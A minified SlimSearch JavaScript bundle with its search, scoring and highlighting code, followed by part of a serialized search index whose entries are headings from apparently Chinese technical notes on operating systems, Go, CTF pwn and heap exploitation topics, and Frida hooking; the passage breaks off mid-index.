const nt="ENTRIES",V="KEYS",T="VALUES",F="";class D{set;_type;_path;constructor(t,s){const n=t._tree,u=Array.from(n.keys());this.set=t,this._type=s,this._path=u.length>0?[{node:n,keys:u}]:[]}next(){const t=this.dive();return this.backtrack(),t}dive(){if(this._path.length===0)return{done:!0,value:void 0};const{node:t,keys:s}=E(this._path);if(E(s)===F)return{done:!1,value:this.result()};const n=t.get(E(s));return this._path.push({node:n,keys:Array.from(n.keys())}),this.dive()}backtrack(){if(this._path.length===0)return;const t=E(this._path).keys;t.pop(),!(t.length>0)&&(this._path.pop(),this.backtrack())}key(){return this.set._prefix+this._path.map(({keys:t})=>E(t)).filter(t=>t!==F).join("")}value(){return E(this._path).node.get(F)}result(){switch(this._type){case T:return this.value();case V:return this.key();default:return[this.key(),this.value()]}}[Symbol.iterator](){return this}}const E=e=>e[e.length-1],ut=(e,t,s)=>{const n=new Map;if(t===void 0)return n;const u=t.length+1,o=u+s,i=new Uint8Array(o*u).fill(s+1);for(let r=0;r<u;++r)i[r]=r;for(let r=1;r<o;++r)i[r*u]=r;return R(e,t,s,n,i,1,u,""),n},R=(e,t,s,n,u,o,i,r)=>{const d=o*i;t:for(const l of e.keys())if(l===F){const a=u[d-1];a<=s&&n.set(r,[e.get(l),a])}else{let a=o;for(let h=0;h<l.length;++h,++a){const m=l[h],p=i*a,f=p-i;let c=u[p];const g=Math.max(0,a-s-1),_=Math.min(i-1,a+s);for(let y=g;y<_;++y){const b=m!==t[y],z=u[f+y]+ +b,A=u[f+y+1]+1,w=u[p+y]+1,L=u[p+y+1]=Math.min(z,A,w);L<c&&(c=L)}if(c>s)continue t}R(e.get(l),t,s,n,u,a,i,r+l)}};class C{_tree;_prefix;_size=void 0;constructor(t=new Map,s=""){this._tree=t,this._prefix=s}atPrefix(t){if(!t.startsWith(this._prefix))throw new Error("Mismatched prefix");const[s,n]=x(this._tree,t.slice(this._prefix.length));if(s===void 0){const[u,o]=M(n);for(const i of u.keys())if(i!==F&&i.startsWith(o)){const r=new Map;return r.set(i.slice(o.length),u.get(i)),new C(r,t)}}return new C(s,t)}clear(){this._size=void 0,this._tree.clear()}delete(t){return this._size=void 0,ot(this._tree,t)}entries(){return new D(this,nt)}forEach(t){for(const[s,n]of this)t(s,n,this)}fuzzyGet(t,s){return ut(this._tree,t,s)}get(t){const s=I(this._tree,t);return s!==void 0?s.get(F):void 0}has(t){const s=I(this._tree,t);return s!==void 0&&s.has(F)}keys(){return new D(this,V)}set(t,s){if(typeof t!="string")throw new Error("key must be a string");return this._size=void 0,O(this._tree,t).set(F,s),this}get size(){if(this._size)return this._size;this._size=0;const t=this.entries();for(;!t.next().done;)this._size+=1;return this._size}update(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);return n.set(F,s(n.get(F))),this}fetch(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);let u=n.get(F);return u===void 0&&n.set(F,u=s()),u}values(){return new D(this,T)}[Symbol.iterator](){return this.entries()}static from(t){const s=new C;for(const[n,u]of t)s.set(n,u);return s}static fromObject(t){return C.from(Object.entries(t))}}const x=(e,t,s=[])=>{if(t.length===0||e==null)return[e,s];for(const n of e.keys())if(n!==F&&t.startsWith(n))return s.push([e,n]),x(e.get(n),t.slice(n.length),s);return s.push([e,t]),x(void 0,"",s)},I=(e,t)=>{if(t.length===0||e==null)return e;for(const s of e.keys())if(s!==F&&t.startsWith(s))return I(e.get(s),t.slice(s.length))},O=(e,t)=>{const s=t.length;t:for(let n=0;e&&n<s;){for(const o of e.keys())if(o!==F&&t[n]===o[0]){const i=Math.min(s-n,o.length);let r=1;for(;r<i&&t[n+r]===o[r];)++r;const d=e.get(o);if(r===o.length)e=d;else{const l=new Map;l.set(o.slice(r),d),e.set(t.slice(n,n+r),l),e.delete(o),e=l}n+=r;continue t}const u=new Map;return e.set(t.slice(n),u),u}return e},ot=(e,t)=>{const[s,n]=x(e,t);if(s!==void 0){if(s.delete(F),s.size===0)W(n);else if(s.size===1){const[u,o]=s.entries().next().value;q(n,u,o)}}},W=e=>{if(e.length===0)return;const[t,s]=M(e);if(t.delete(s),t.size===0)W(e.slice(0,-1));else if(t.size===1){const[n,u]=t.entries().next().value;n!==F&&q(e.slice(0,-1),n,u)}},q=(e,t,s)=>{if(e.length===0)return;const[n,u]=M(e);n.set(u+t,s),n.delete(u)},M=e=>e[e.length-1],it=(e,t)=>{const s=e._idToShortId.get(t);if(s!=null)return e._storedFields.get(s)},rt=/[\n\r -#%-*,-/:;?@[-\]_{}\u00A0\u00A1\u00A7\u00AB\u00B6\u00B7\u00BB\u00BF\u037E\u0387\u055A-\u055F\u0589\u058A\u05BE\u05C0\u05C3\u05C6\u05F3\u05F4\u0609\u060A\u060C\u060D\u061B\u061E\u061F\u066A-\u066D\u06D4\u0700-\u070D\u07F7-\u07F9\u0830-\u083E\u085E\u0964\u0965\u0970\u09FD\u0A76\u0AF0\u0C77\u0C84\u0DF4\u0E4F\u0E5A\u0E5B\u0F04-\u0F12\u0F14\u0F3A-\u0F3D\u0F85\u0FD0-\u0FD4\u0FD9\u0FDA\u104A-\u104F\u10FB\u1360-\u1368\u1400\u166E\u1680\u169B\u169C\u16EB-\u16ED\u1735\u1736\u17D4-\u17D6\u17D8-\u17DA\u1800-\u180A\u1944\u1945\u1A1E\u1A1F\u1AA0-\u1AA6\u1AA8-\u1AAD\u1B5A-\u1B60\u1BFC-\u1BFF\u1C3B-\u1C3F\u1C7E\u1C7F\u1CC0-\u1CC7\u1CD3\u2000-\u200A\u2010-\u2029\u202F-\u2043\u2045-\u2051\u2053-\u205F\u207D\u207E\u208D\u208E\u2308-\u230B\u2329\u232A\u2768-\u2775\u27C5\u27C6\u27E6-\u27EF\u2983-\u2998\u29D8-\u29DB\u29FC\u29FD\u2CF9-\u2CFC\u2CFE\u2CFF\u2D70\u2E00-\u2E2E\u2E30-\u2E4F\u3000-\u3003\u3008-\u3011\u3014-\u301F\u3030\u303D\u30A0\u30FB\uA4FE\uA4FF\uA60D-\uA60F\uA673\uA67E\uA6F2-\uA6F7\uA874-\uA877\uA8CE\uA8CF\uA8F8-\uA8FA\uA8FC\uA92E\uA92F\uA95F\uA9C1-\uA9CD\uA9DE\uA9DF\uAA5C-\uAA5F\uAADE\uAADF\uAAF0\uAAF1\uABEB\uFD3E\uFD3F\uFE10-\uFE19\uFE30-\uFE52\uFE54-\uFE61\uFE63\uFE68\uFE6A\uFE6B\uFF01-\uFF03\uFF05-\uFF0A\uFF0C-\uFF0F\uFF1A\uFF1B\uFF1F\uFF20\uFF3B-\uFF3D\uFF3F\uFF5B\uFF5D\uFF5F-\uFF65]+/u,S="or",$="and",ct="and_not",lt=(e,t)=>{e.includes(t)||e.push(t)},P=(e,t)=>{for(const s of t)e.includes(s)||e.push(s)},N=({score:e},{score:t})=>t-e,ht=()=>new Map,k=e=>{const t=new Map;for(const s of Object.keys(e))t.set(parseInt(s,10),e[s]);return t},G=(e,t)=>Object.prototype.hasOwnProperty.call(e,t)?e[t]:void 0,dt={[S]:(e,t)=>{for(const s of t.keys()){const n=e.get(s);if(n==null)e.set(s,t.get(s));else{const{score:u,terms:o,match:i}=t.get(s);n.score=n.score+u,n.match=Object.assign(n.match,i),P(n.terms,o)}}return e},[$]:(e,t)=>{const s=new Map;for(const n of t.keys()){const u=e.get(n);if(u==null)continue;const{score:o,terms:i,match:r}=t.get(n);P(u.terms,i),s.set(n,{score:u.score+o,terms:u.terms,match:Object.assign(u.match,r)})}return s},[ct]:(e,t)=>{for(const s of t.keys())e.delete(s);return e}},at=(e,t,s,n,u,o)=>{const{k:i,b:r,d}=o;return Math.log(1+(s-t+.5)/(t+.5))*(d+e*(i+1)/(e+i*(1-r+r*n/u)))},ft=e=>(t,s,n)=>{const u=typeof e.fuzzy=="function"?e.fuzzy(t,s,n):e.fuzzy||!1,o=typeof e.prefix=="function"?e.prefix(t,s,n):e.prefix===!0;return{term:t,fuzzy:u,prefix:o}},H=(e,t,s,n)=>{for(const u of Object.keys(e._fieldIds))if(e._fieldIds[u]===s){e._options.logger("warn",`SlimSearch: document with ID ${e._documentIds.get(t)} has changed before removal: term "${n}" was not present in field "${u}". Removing a document after it has changed can corrupt the index!`,"version_conflict");return}},gt=(e,t,s,n)=>{if(!e._index.has(n)){H(e,s,t,n);return}const u=e._index.fetch(n,ht),o=u.get(t);o==null||o.get(s)==null?H(e,s,t,n):o.get(s)<=1?o.size<=1?u.delete(t):o.delete(s):o.set(s,o.get(s)-1),e._index.get(n).size===0&&e._index.delete(n)},mt={k:1.2,b:.7,d:.5},pt={idField:"id",extractField:(e,t)=>e[t],tokenize:e=>e.split(rt),processTerm:e=>e.toLowerCase(),fields:void 0,searchOptions:void 0,storeFields:[],logger:(e,t)=>{typeof console?.[e]=="function"&&console[e](t)},autoVacuum:!0},J={combineWith:S,prefix:!1,fuzzy:!1,maxFuzzy:6,boost:{},weights:{fuzzy:.45,prefix:.375},bm25:mt},Ft={combineWith:$,prefix:(e,t,s)=>t===s.length-1},_t={batchSize:1e3,batchWait:10},U={minDirtFactor:.1,minDirtCount:20},yt={..._t,...U},Y=(e,t=S)=>{if(e.length===0)return new Map;const s=t.toLowerCase();return e.reduce(dt[s])||new Map},B=(e,t,s,n,u,o,i,r,d=new Map)=>{if(u==null)return d;for(const l of Object.keys(o)){const a=o[l],h=e._fieldIds[l],m=u.get(h);if(m==null)continue;let p=m.size;const f=e._avgFieldLength[h];for(const c of m.keys()){if(!e._documentIds.has(c)){gt(e,h,c,s),p-=1;continue}const g=i?i(e._documentIds.get(c),s,e._storedFields.get(c)):1;if(!g)continue;const _=m.get(c),y=e._fieldLength.get(c)[h],b=at(_,p,e._documentCount,y,f,r),z=n*a*g*b,A=d.get(c);if(A){A.score+=z,lt(A.terms,t);const w=G(A.match,s);w?w.push(l):A.match[s]=[l]}else d.set(c,{score:z,terms:[t],match:{[s]:[l]}})}}return d},At=(e,t,s)=>{const n={...e._options.searchOptions,...s},u=(n.fields||e._options.fields).reduce((c,g)=>({...c,[g]:G(n.boost,g)||1}),{}),{boostDocument:o,weights:i,maxFuzzy:r,bm25:d}=n,{fuzzy:l,prefix:a}={...J.weights,...i},h=e._index.get(t.term),m=B(e,t.term,t.term,1,h,u,o,d);let p,f;if(t.prefix&&(p=e._index.atPrefix(t.term)),t.fuzzy){const c=t.fuzzy===!0?.2:t.fuzzy,g=c<1?Math.min(r,Math.round(t.term.length*c)):c;g&&(f=e._index.fuzzyGet(t.term,g))}if(p)for(const[c,g]of p){const _=c.length-t.term.length;if(!_)continue;f?.delete(c);const y=a*c.length/(c.length+.3*_);B(e,t.term,c,y,g,u,o,d,m)}if(f)for(const c of f.keys()){const[g,_]=f.get(c);if(!_)continue;const y=l*c.length/(c.length+_);B(e,t.term,c,y,g,u,o,d,m)}return m},X=(e,t,s={})=>{if(typeof t!="string"){const a={...s,...t,queries:void 0},h=t.queries.map(m=>X(e,m,a));return Y(h,a.combineWith)}const{tokenize:n,processTerm:u,searchOptions:o}=e._options,i={tokenize:n,processTerm:u,...o,...s},{tokenize:r,processTerm:d}=i,l=r(t).flatMap(a=>d(a)).filter(a=>!!a).map(ft(i)).map(a=>At(e,a,i));return Y(l,i.combineWith)},K=(e,t,s={})=>{const n=X(e,t,s),u=[];for(const[o,{score:i,terms:r,match:d}]of n){const l=r.length,a={id:e._documentIds.get(o),score:i*l,terms:Object.keys(d),match:d};Object.assign(a,e._storedFields.get(o)),(s.filter==null||s.filter(a))&&u.push(a)}return u.sort(N),u},Ct=(e,t,s={})=>{s={...e._options.autoSuggestOptions,...s};const n=new Map;for(const{score:o,terms:i}of K(e,t,s)){const r=i.join(" "),d=n.get(r);d!=null?(d.score+=o,d.count+=1):n.set(r,{score:o,terms:i,count:1})}const u=[];for(const[o,{score:i,terms:r,count:d}]of n)u.push({suggestion:o,terms:r,score:i/d});return u.sort(N),u};class Et{_options;_index;_documentCount;_documentIds;_idToShortId;_fieldIds;_fieldLength;_avgFieldLength;_nextId;_storedFields;_dirtCount;_currentVacuum;_enqueuedVacuum;_enqueuedVacuumConditions;constructor(t){if(t?.fields==null)throw new Error('SlimSearch: option "fields" must be provided');const s=t.autoVacuum==null||t.autoVacuum===!0?yt:t.autoVacuum;this._options={...pt,...t,autoVacuum:s,searchOptions:{...J,...t.searchOptions||{}},autoSuggestOptions:{...Ft,...t.autoSuggestOptions||{}}},this._index=new C,this._documentCount=0,this._documentIds=new Map,this._idToShortId=new Map,this._fieldIds={},this._fieldLength=new Map,this._avgFieldLength=[],this._nextId=0,this._storedFields=new Map,this._dirtCount=0,this._currentVacuum=null,this._enqueuedVacuum=null,this._enqueuedVacuumConditions=U,this.addFields(this._options.fields)}get isVacuuming(){return this._currentVacuum!=null}get dirtCount(){return this._dirtCount}get dirtFactor(){return this._dirtCount/(1+this._documentCount+this._dirtCount)}get documentCount(){return this._documentCount}get termCount(){return this._index.size}toJSON(){const t=[];for(const[s,n]of this._index){const u={};for(const[o,i]of n)u[o]=Object.fromEntries(i);t.push([s,u])}return{documentCount:this._documentCount,nextId:this._nextId,documentIds:Object.fromEntries(this._documentIds),fieldIds:this._fieldIds,fieldLength:Object.fromEntries(this._fieldLength),averageFieldLength:this._avgFieldLength,storedFields:Object.fromEntries(this._storedFields),dirtCount:this._dirtCount,index:t,serializationVersion:2}}addFields(t){for(let s=0;s<t.length;s++)this._fieldIds[t[s]]=s}}const zt=({index:e,documentCount:t,nextId:s,documentIds:n,fieldIds:u,fieldLength:o,averageFieldLength:i,storedFields:r,dirtCount:d,serializationVersion:l},a)=>{if(l!==1&&l!==2)throw new Error("SlimSearch: cannot deserialize an index created with an incompatible version");const h=new Et(a);h._documentCount=t,h._nextId=s,h._documentIds=k(n),h._idToShortId=new Map,h._fieldIds=u,h._fieldLength=k(o),h._avgFieldLength=i,h._storedFields=k(r),h._dirtCount=d||0,h._index=new C;for(const[m,p]of h._documentIds)h._idToShortId.set(p,m);for(const[m,p]of e){const f=new Map;for(const c of Object.keys(p)){let g=p[c];l===1&&(g=g.ds),f.set(parseInt(c,10),k(g))}h._index.set(m,f)}return h},Q=Object.entries,wt=Object.fromEntries,j=(e,t)=>{const s=e.toLowerCase(),n=t.toLowerCase(),u=[];let o=0,i=0;const r=(l,a=!1)=>{let h="";i===0?h=l.length>20?`… ${l.slice(-20)}`:l:a?h=l.length+i>100?`${l.slice(0,100-i)}… `:l:h=l.length>20?`${l.slice(0,20)} … ${l.slice(-20)}`:l,h&&u.push(h),i+=h.length,a||(u.push(["mark",t]),i+=t.length,i>=100&&u.push(" …"))};let d=s.indexOf(n,o);if(d===-1)return null;for(;d>=0;){const l=d+n.length;if(r(e.slice(o,d)),o=l,i>100)break;d=s.indexOf(n,o)}return i<100&&r(e.slice(o),!0),u},Z=/[\u4e00-\u9fa5]/g,tt=(e={})=>({fuzzy:.2,prefix:!0,processTerm:t=>{const s=t.match(Z)||[],n=t.replace(Z,"").toLowerCase();return n?[n,...s]:[...s]},...e}),xt=(e,t)=>t.contents.reduce((s,[,n])=>s+n,0)-e.contents.reduce((s,[,n])=>s+n,0),kt=(e,t)=>Math.max(...t.contents.map(([,s])=>s))-Math.max(...e.contents.map(([,s])=>s)),et=(e,t,s={})=>{const n={};return K(t,e,tt({boost:{h:2,t:1,c:4},...s})).forEach(u=>{const{id:o,terms:i,score:r}=u,d=o.includes("@"),l=o.includes("#"),[a,h]=o.split(/[#@]/),m=i.sort((f,c)=>f.length-c.length).filter((f,c)=>i.slice(c+1).every(g=>!g.includes(f))),{contents:p}=n[a]??={title:"",contents:[]};if(d)p.push([{type:"customField",key:a,index:h,display:m.map(f=>u.c.map(c=>j(c,f))).flat().filter(f=>f!==null)},r]);else{const f=m.map(c=>j(u.h,c)).filter(c=>c!==null);if(f.length&&p.push([{type:l?"heading":"title",key:a,...l&&{anchor:h},display:f},r]),"t"in u)for(const c of u.t){const g=m.map(_=>j(c,_)).filter(_=>_!==null);g.length&&p.push([{type:"text",key:a,...l&&{anchor:h},display:g},r])}}}),Q(n).sort(([,u],[,o])=>"max"==="total"?xt(u,o):kt(u,o)).map(([u,{title:o,contents:i}])=>{if(!o){const r=it(t,u);r&&(o=r.h)}return{title:o,contents:i.map(([r])=>r)}})},st=(e,t,s={})=>Ct(t,e,tt(s)).map(({suggestion:n})=>n),v=wt(Q(JSON.parse("{\"/\":{\"documentCount\":527,\"nextId\":527,\"documentIds\":{\"0\":\"v-8daa1a0e\",\"1\":\"v-e170aee8\",\"2\":\"v-0b56d418\",\"3\":\"v-0b56d418#操作系统\",\"4\":\"v-0b56d418#套接字\",\"5\":\"v-0b56d418#linux-中内存管理\",\"6\":\"v-0b56d418#tcp和udp区别\",\"7\":\"v-0b56d418#四种锁的区别-todo\",\"8\":\"v-0b56d418#cow-与row\",\"9\":\"v-0b56d418#用途\",\"10\":\"v-0b56d418#虚拟内存\",\"11\":\"v-0b56d418#虚拟地址的cow\",\"12\":\"v-0b56d418#内存对齐\",\"13\":\"v-0b56d418#管道\",\"14\":\"v-0b56d418#并发与并行\",\"15\":\"v-0b56d418#文件描述符\",\"16\":\"v-0b56d418#fork函数\",\"17\":\"v-0b56d418#fork的cow技术\",\"18\":\"v-0b56d418#重定向\",\"19\":\"v-0b56d418#信号中断\",\"20\":\"v-0b56d418#类型\",\"21\":\"v-0b56d418#处理\",\"22\":\"v-0b56d418#go底层\",\"23\":\"v-0b56d418#面试技巧\",\"24\":\"v-0b56d418#结构体中指针函数和普通函数\",\"25\":\"v-0b56d418#字典实现\",\"26\":\"v-0b56d418#接口实现\",\"27\":\"v-0b56d418#数组实现\",\"28\":\"v-0b56d418#切片实现\",\"29\":\"v-0b56d418#函数调用规范\",\"30\":\"v-0b56d418#深-浅copy\",\"31\":\"v-0b56d418#闭包\",\"32\":\"v-0b56d418#一等公民\",\"33\":\"v-0b56d418#python\",\"34\":\"v-0b56d418#asyncio-todo\",\"35\":\"v-0b56d418#pwn\",\"36\":\"v-0b56d418#ret2dl\",\"37\":\"v-0b56d418#c-main函数参数含义\",\"38\":\"v-0b56d418#canary-多线程绕过\",\"39\":\"v-0b56d418#格式化字符串\",\"40\":\"v-0b56d418#orw沙箱绕过总结\",\"41\":\"v-0b56d418#seccomp-bpf\",\"42\":\"v-0b56d418#常规绕过\",\"43\":\"v-0b56d418#io-uring利用\",\"44\":\"v-0b56d418#refq和retf详解\",\"45\":\"v-0b56d418#为什么用rax间接传参\",\"46\":\"v-0b56d418#arm架构函数调用规范-armv7和armv8的区别\",\"47\":\"v-0b56d418#armv7\",\"48\":\"v-0b56d418#armv8\",\"49\":\"v-0b56d418#mips架构的函数调用规范\",\"50\":\"v-0b56d418#phppwn堆管理机制\",\"51\":\"v-0b56d418#cpp堆管理机制-todo\",\"52\":\"v-0b56d418#musl堆管理器\",\"53\":\"v-0b56d418#堆利用\",\"54\":\"v-0b56d418#malloc函数中的一些检查机制\",\"55\":\"v-0b56d418#常见利用技巧\",\"56\":\"v-0b56d418#house-of-force-top-chunk-利用\",\"57\":\"v-0b56d418#largebin-attack\",\"58\":\"v-0b56d418#smallbin-attack-todo\",\"59\":\"v-0b56d418#house-of-kiwi\",\"60\":\"v-0b56d418#house-of-cat\",\"61\":\"v-0b56d418#printf-puts-io调用链-todo\",\"62\":\"v-0b56d418#linux-kernel\",\"63\":\"v-0b56d418#段保护模式-页保护模式\",\"64\":\"v-0b56d418#虚拟地址转化为线性地址\",\"65\":\"v-0b56d418#实-保护模式\",\"66\":\"v-0b56d418#进程\",\"67\":\"v-0b56d418#execve\",\"68\":\"v-0b56d418#oom机制\",\"69\":\"v-0b56d418#如何保护一个进程不被-oom-杀掉呢\",\"70\":\"v-0b56d418#linux的内存管理\",\"71\":\"v-0b56d418#如果4g物理内存的机子上面申请8g内存会怎样\",\"72\":\"v-0b56d418#pwn-linux-kernel\",\"73\":\"v-0b56d418#调试\",\"74\":\"v-0b56d418#常规保护机制\",\"75\":\"v-0b56d418#常用利用结构体\",\"76\":\"v-0b56d418#mm-struct\",\"77\":\"v-0b56d418#vm-arena-struct结构体-双向链表\",\"78\":\"v-0b56d418#cred结构体\",\"79\":\"v-0b56d418#tty-struct\",\"80\":\"v-0b56d418#堆喷-脏管道学习-todo\",\"81\":\"v-0b56d418#v8-jsc-todo\",\"82\":\"v-0b56d418#标记指针\",\"83\":\"v-0b56d418#压缩指针\",\"84\":\"v-0b56d418#js对象基础属性\",\"85\":\"v-0b56d418#编译整体流程-todo\",\"86\":\"v-0b56d418#如何调试-todo\",\"87\":\"v-0b56d418#编译原理\",\"88\":\"v-0b56d418#语法解析-todo\",\"89\":\"v-0b56d418#token生成-todo\",\"90\":\"v-0b56d418#ast生成-todo\",\"91\":\"v-0b56d418#字面量语法树\",\"92\":\"v-0b56d418#一元运算抽象语法树\",\"93\":\"v-0b56d418#二元运算抽象语法树\",\"94\":\"v-0b56d418#中间代码生成-todo\",\"95\":\"v-0b56d418#链接与库-todo\",\"96\":\"v-0b56d418#ld的链接-todo\",\"97\":\"v-0b56d418#开发框架-todo\",\"98\":\"v-0b56d418#消息队列\",\"99\":\"v-0b56d418#kafka\",\"100\":\"v-0b56d418#rabbitmq\",\"101\":\"v-0b56d418#rocketmq\",\"102\":\"v-0b56d418#postgresql-数据库\",\"103\":\"v-0b56d418#asyncio-异步框架\",\"104\":\"v-0b56d418#日志框架\",\"105\":\"v-6cea81ab\",\"106\":\"v-6cea81ab#必备的信息\",\"107\":\"v-6cea81ab#项目背景-background\",\"108\":\"v-6cea81ab#安装和使用-install-usage\",\"109\":\"v-6cea81ab#badge\",\"110\":\"v-6cea81ab#主要项目负责人-maintainers\",\"111\":\"v-6cea81ab#参加贡献的方式-contributing\",\"112\":\"v-6cea81ab#开源协议-license\",\"113\":\"v-623b66b3\",\"114\":\"v-623b66b3#映射端口\",\"115\":\"v-623b66b3#pc查询手机的进程\",\"116\":\"v-623b66b3#hook相关\",\"117\":\"v-623b66b3#hook-js脚本\",\"118\":\"v-623b66b3#附着脚本\",\"119\":\"v-623b66b3#js代码的书写\",\"120\":\"v-623b66b3#使用java的平台\",\"121\":\"v-623b66b3#获取指定的java类\",\"122\":\"v-623b66b3#调用原本的函数\",\"123\":\"v-623b66b3#hook重载函数\",\"124\":\"v-623b66b3#hook构造方法\",\"125\":\"v-623b66b3#修改类的字段\",\"126\":\"v-623b66b3#枚举所有的类和方法\",\"127\":\"v-623b66b3#hook-so中的函数\",\"128\":\"v-4e13633e\",\"129\":\"v-4e13633e#实战\",\"130\":\"v-4e13633e#获取包名\",\"131\":\"v-4e13633e#hook-一个测试脚本\",\"132\":\"v-a8c94236\",\"133\":\"v-a8c94236#链接\",\"134\":\"v-a8c94236#初步探索\",\"135\":\"v-a8c94236#分析\",\"136\":\"v-a8c94236#istextwidgetactive\",\"137\":\"v-a8c94236#getcursorposition\",\"138\":\"v-a8c94236#tick\",\"139\":\"v-38d36cdf\",\"140\":\"v-38d36cdf#学习文章\",\"141\":\"v-38d36cdf#主标签\",\"142\":\"v-38d36cdf#默认activity\",\"143\":\"v-38d36cdf#intent-filter标签\",\"144\":\"v-38d36cdf#默认activity标志\",\"145\":\"v-508d6b3c\",\"146\":\"v-508d6b3c#操作系统\",\"147\":\"v-508d6b3c#套接字\",\"148\":\"v-508d6b3c#linux-中内存管理\",\"149\":\"v-508d6b3c#tcp和udp区别\",\"150\":\"v-508d6b3c#cow-与row\",\"151\":\"v-508d6b3c#用途\",\"152\":\"v-508d6b3c#虚拟内存\",\"153\":\"v-508d6b3c#虚拟地址的cow\",\"154\":\"v-508d6b3c#内存对齐\",\"155\":\"v-508d6b3c#管道\",\"156\":\"v-508d6b3c#并发与并行\",\"157\":\"v-508d6b3c#文件描述符\",\"158\":\"v-508d6b3c#fork函数\",\"159\":\"v-508d6b3c#fork的cow技术\",\"160\":\"v-508d6b3c#重定向\",\"161\":\"v-508d6b3c#信号中断\",\"162\":\"v-508d6b3c#类型\",\"163\":\"v-508d6b3c#处理\",\"164\":\"v-508d6b3c#go底层\",\"165\":\"v-508d6b3c#面试技巧\",\"166\":\"v-508d6b3c#结构体中指针函数和普通函数\",\"167\":\"v-508d6b3c#字典实现\",\"168\":\"v-508d6b3c#接口实现\",\"169\":\"v-508d6b3c#数组实现\",\"170\":\"v-508d6b3c#切片实现\",\"171\":\"v-508d6b3c#函数调用规范\",\"172\":\"v-508d6b3c#深-浅copy\",\"173\":\"v-508d6b3c#闭包\",\"174\":\"v-508d6b3c#一等公民\",\"175\":\"v-508d6b3c#pwn\",\"176\":\"v-508d6b3c#ret2dl\",\"177\":\"v-508d6b3c#c-main函数参数含义\",\"178\":\"v-508d6b3c#canary-多线程绕过\",\"179\":\"v-508d6b3c#格式化字符串\",\"180\":\"v-508d6b3c#orw沙箱绕过总结\",\"181\":\"v-508d6b3c#seccomp-bpf\",\"182\":\"v-508d6b3c#常规绕过\",\"183\":\"v-508d6b3c#io-uring利用\",\"184\":\"v-508d6b3c#refq和retf详解\",\"185\":\"v-508d6b3c#为什么用rax间接传参\",\"186\":\"v-508d6b3c#arm架构函数调用规范-armv7和armv8的区别\",\"187\":\"v-508d6b3c#armv7\",\"188\":\"v-508d6b3c#armv8\",\"189\":\"v-508d6b3c#mips架构的函数调用规范\",\"190\":\"v-508d6b3c#phppwn堆管理机制\",\"191\":\"v-508d6b3c#cpp堆管理机制-todo\",\"192\":\"v-508d6b3c#musl堆管理器\",\"193\":\"v-508d6b3c#堆利用\",\"194\":\"v-508d6b3c#malloc函数中的一些检查机制\",\"195\":\"v-508d6b3c#常见利用技巧\",\"196\":\"v-508d6b3c#house-of-force-top-chunk-利用\",\"197\":\"v-508d6b3c#largebin-attack\",\"198\":\"v-508d6b3c#smallbin-attack-todo\",\"199\":\"v-508d6b3c#house-of-kiwi\",\"200\":\"v-508d6b3c#house-of-cat\",\"201\":\"v-508d6b3c#printf-puts-io调用链-todo\",\"202\":\"v-508d6b3c#linux-kernel\",\"203\":\"v-508d6b3c#段保护模式-页保护模式\",\"204\":\"v-508d6b3c#虚拟地址转化为线性地址\",\"205\":\"v-508d6b3c#实-保护模式\",\"206\":\"v-508d6b3c#进程\",\"207\":\"v-508d6b3c#execve\",\"208\":\"v-508d6b3c#oom机制\",\"209\":\"v-508d6b3c#如何保护一个进程不被-oom-杀掉呢\",\"210\":\"v-508d6b3c#linux的内存管理\",\"211\":\"v-508d6b3c#如果4g物理内存的机子上面申请8g内存会怎样\",\"212\":\"v-508d6b3c#pwn-linux-kernel\",\"213\":\"v-508d6b3c#调试\",\"214\":\"v-508d6b3c#常规保护机制\",\"215\":\"v-508d6b3c#常用利用结构体\",\"216\":\"v-508d6b3c#mm-struct\",\"217\":\"v-508d6b3c#vm-arena-struct结构体-双向链表\",\"218\":\"v-508d6b3c#cred结构体\",\"219\":\"v-508d6b3c#tty-struct\",\"220\":\"v-508d6b3c#堆喷-脏管道学习-todo\",\"221\":\"v-508d6b3c#v8-jsc-todo\",\"222\":\"v-508d6b3c#标记指针\",\"223\":\"v-508d6b3c#压缩指针\",\"224\":\"v-508d6b3c#js对象基础属性\",\"225\":\"v-508d6b3c#编译整体流程-todo\",\"226\":\"v-508d6b3c#如何调试-todo\",\"227\":\"v-508d6b3c#编译原理\",\"228\":\"v-508d6b3c#语法解析-todo\",\"229\":\"v-508d6b3c#token生成-todo\",\"230\":\"v-508d6b3c#ast生成-todo\",\"231\":\"v-508d6b3c#字面量语法树\",\"232\":\"v-508d6b3c#一元运算抽象语法树\",\"233\":\"v-508d6b3c#二元运算抽象语法树\",\"234\":\"v-508d6b3c#中间代码生成-todo\",\"235\":\"v-508d6b3c#链接与库-todo\",\"236\":\"v-508d6b3c#ld的链接-todo\",\"237\":\"v-6e1384e9\",\"238\":\"v-6e1384e9#背景\",\"239\":\"v-6e1384e9#了解知识点\",\"240\":\"v-6e1384e9#计算方式\",\"241\":\"v-6e1384e9#安全性\",\"242\":\"v-6e1384e9#代码实现\",\"243\":\"v-6e1384e9#ctf中常见题型\",\"244\":\"v-ff0f1164\",\"245\":\"v-ff0f1164#常见开发遇到的规范问题\",\"246\":\"v-ff0f1164#mvc代码设计模式\",\"247\":\"v-ff0f1164#model\",\"248\":\"v-ff0f1164#view\",\"249\":\"v-ff0f1164#controller\",\"250\":\"v-ff0f1164#观察者模型\",\"251\":\"v-ff0f1164#发布订阅模式\",\"252\":\"v-ff0f1164#失血模型-贫血模型-充血模型和胀血模型\",\"253\":\"v-b82f493c\",\"254\":\"v-b82f493c#go中建立websocket\",\"255\":\"v-b82f493c#go检测websocket链接是否存在\",\"256\":\"v-3bce6cc4\",\"257\":\"v-3bce6cc4#版本对应\",\"258\":\"v-3bce6cc4#操作指令\",\"259\":\"v-3bce6cc4#主力pwn环境\",\"260\":\"v-3bce6cc4#pull-image\",\"261\":\"v-3bce6cc4#error\",\"262\":\"v-3bce6cc4#各版本的轻量级pwn环境\",\"263\":\"v-b571a054\",\"264\":\"v-b571a054#提交信息格式\",\"265\":\"v-b571a054#格式\",\"266\":\"v-b571a054#commit的内容\",\"267\":\"v-b571a054#分支管理\",\"268\":\"v-b571a054#主分支\",\"269\":\"v-b571a054#code-review\",\"270\":\"v-b571a054#提交pr的规范\",\"271\":\"v-13caecc3\",\"272\":\"v-13caecc3#目的\",\"273\":\"v-13caecc3#使用git-revert原因\",\"274\":\"v-13caecc3#git-revert的类型\",\"275\":\"v-13caecc3#使用git-revert的注意事项\",\"276\":\"v-13caecc3#实践\",\"277\":\"v-e329e17e\",\"278\":\"v-e329e17e#基础对象\",\"279\":\"v-e329e17e#eventloop\",\"280\":\"v-e329e17e#future\",\"281\":\"v-e329e17e#generator生